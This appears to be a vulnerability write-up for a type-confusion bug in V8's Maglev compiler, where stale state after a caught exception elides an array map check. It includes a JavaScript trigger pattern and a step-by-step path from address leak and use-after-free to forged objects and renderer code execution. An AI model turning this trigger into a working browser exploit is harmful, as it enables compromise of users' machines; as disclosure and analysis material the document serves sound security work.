Exploit Scenario

// Vulnerable function pattern
function f(arr, cb) {
    let first = arr[0];  // Seeds KNA: PACKED_DOUBLE_ELEMENTS map + elements ptr cached
    try {
        cb();             // can_throw ∧ can_write → MergeThrow(stale KNA) then MarkSideEffect
    } catch(e) {
        return arr[0];   // Map check ELIDED. Elements ptr may be stale FixedDoubleArray.
                          // If PACKED_ELEMENTS: loads tagged pointer as float64 → addr leak.
                          // If stale ptr: loads from freed/reused FixedDoubleArray → UAF.
    }
}

function malicb() {
    arr[0] = {};   // Transitions PACKED_DOUBLE_ELEMENTS → PACKED_ELEMENTS

    throw 0;
}

Impact

Bug:   MergeThrow seeds catch-block KNA with pre-call state (maps_are_stale=false,
       loaded_properties_ containing stale elements pointer).

Attack surface: any attacker-callable JS that:
  - Runs in a Maglev-compiled function (ordinary tier-up)
  - Has try { call(attacker_callback) } catch { access_array }
  - exception_handler_was_used=true before tier-up

Type confusion step by step:
  1. arr = [1.1, 2.2, 3.3]              → PACKED_DOUBLE_ELEMENTS, elements=FixDoubleArr[A]
  2. arr[0] before try                   → KNA: map=PACKED_DOUBLE, elements_ptr=A
  3. cb() → arr[0]={}, throw            → arr transitions to PACKED_ELEMENTS, elements=FixArr[B]
                                            old FixDoubleArr[A] becomes garbage
  4. catch: arr[0]                       → stale KNA: map check ELIDED
     a) If loaded_properties_ caches A: → load from FixDoubleArr[A] (stale / possibly UAF)
                                            as float64 → returns 1.1 (or garbage if A reused)
     b) If fresh load from B:            → load from FixArr[B] as float64
                                            → tagged ptr to {} as float64 → address leak

Both (a) and (b) are exploitable: (a) is a GC-controlled UAF on the FixedDoubleArray,
(b) is a direct address leak. With a double STORE into the stale/wrong elements:
  arr[0] = craft_float(forged_addr)     → write raw bits into tagged slot → forged object
  → arbitrary read/write inside V8 heap → renderer RCE / sandbox escape
